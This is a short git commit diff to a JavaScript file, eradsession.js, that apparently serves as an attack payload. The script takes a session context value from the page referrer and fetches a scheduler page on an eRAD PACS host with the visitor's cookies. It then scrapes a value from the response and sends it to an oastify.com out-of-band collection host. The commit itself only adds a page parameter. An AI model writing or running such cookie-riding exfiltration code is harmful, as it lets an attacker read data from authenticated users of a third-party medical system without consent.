d96f477584452be6bf86837496532dea056401bc
tomoncrss <tonymyson89823@gmail.com>
2026-02-25 12:21:10 +0330

    Update eradsession.js

--- eradsession.js
+++ eradsession.js
@@ -3,7 +3,7 @@ let ref=document.referrer;
 let c=ref.match(/cContext=([^&]+)/);
 if(c){
 let ctx=c[1];
-fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cContext='+ctx,{credentials:'include'})
+fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cPage=1&cContext='+ctx,{credentials:'include'})
 .then(r=>r.text())
 .then(t=>{
 let m=t.match(/<A[^>]+href="JavaScript:\s*redirPage_eP\('\/scheduler\/valueSelectorPopupTable\.jsp\?cPage=(\d+)'\)">Last<\/a>/i);
@@ -11,3 +11,4 @@ if(m) fetch('https://qhbh6mfx3whnldsefhpxqwuvdmjd75ct1.oastify.com?lastpage='+m[
 });
 }
 })();
+
